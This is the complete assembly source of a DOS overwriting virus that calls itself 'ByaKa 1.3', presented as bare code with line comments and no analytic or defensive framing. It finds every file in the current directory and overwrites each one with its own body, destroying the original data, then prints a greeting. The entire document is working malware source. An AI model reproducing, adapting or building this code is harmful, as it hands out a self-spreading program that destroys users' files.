CODE SEGMENT
org  100h
start_virus:
call init
init:
               pop  si
               sub  si,offset init

;====================== c o d e  b e g i n s  h e r e =========================
                                                      ;========================
               mov  ah,1Ah                            ;= We're setting
               lea  dx,[dta+si]                       ;= the
               int  21h                               ;= DTA Buffer
                                                      ;=======================
               call Find_F                            ;= call FindFirst Proc
               jc   quit                              ;= quit if no files
dir:           call Find_N                            ;= call FindNext Proc
               jc   quit                              ;= quit if no files
                                                      ;=======================
               call infect_file                       ;= Go Infect file
               jmp  short dir                         ;= continue search
                                                      ;=======================
quit:          lea  dx,[GoodMessage+si]               ;= Giveout some good msg.
               mov  ah,9h                             ;= dos print-string
               int  21h                               ;= Do it!
               mov  ah,4Ch                            ;= all done,thank ya!
               int  21h                               ;= Terminate program.
                                                      ;========================
;====================== s u b r o u t i n e  b l o c k ========================
Find_F         proc                                   ;========================
                                                      ;= Find_First routine
               lea  dx,[_mask+si]                     ;= Load "Path" to DX
               mov  ah,4Eh                            ;= DOS Find_First
               mov  cx,110101b                        ;= all file attr exc.hidn
               int  21h                               ;= come on,DO IT!
               ret                                    ;= return to main prog.
Find_F         endp                                   ;========================
Find_N         proc                                   ;========================
                                                      ;= Find_Next routine
               lea  dx,[dta+si]                       ;= Load DTA buffer to DX
               mov  ah,4Fh                            ;= DOS Find_Next
               int  21h                               ;= Go,DO IT!
               ret                                    ;= return to main prog.
Find_N         endp                                   ;========================
Infect_FILE    proc near                              ;========================
                                                      ;= Infect file subr.
               mov  ax,3d02h                          ;= DOS open f. for r/w
               lea  dx,[dta+30+si]                    ;= Filename
               int  21h                               ;= Do IT!
               mov  bx,ax                             ;= AX,BX handle exch.
                                                      ;=======================
               mov  ah,40h                            ;= DOS Write to file
               mov  cx,end_virus-start_virus          ;= Length of record
               lea  dx,[start_virus+si]               ;= Buffer
               int  21h                               ;= Go,Do It!
                                                      ;=======================
               mov  ah,3eh                            ;= DOS close file
               int  21h                               ;= Do it!
               retn                                   ;= return to main prog.
Infect_FILE    endp                                   ;=======================
;====================== d a t a  b e g i n s  h e r e =========================
_mask          db       '*.*',0                       ;= File mask
goodmessage    db       'Greetz ByaKa 1.3',13,10,'$'
buffer1        db       3 dup (?)
buffer2        db       3 dup (?)
f_size         dw       ?
virname        db       '[ByaKa]'
dta            db       50 dup(?)                     ;= The DTA buffer
;====================== d a t a   e n d s   h e r e =========================
end_virus      equ      $
CODE ENDS
   end start_virus
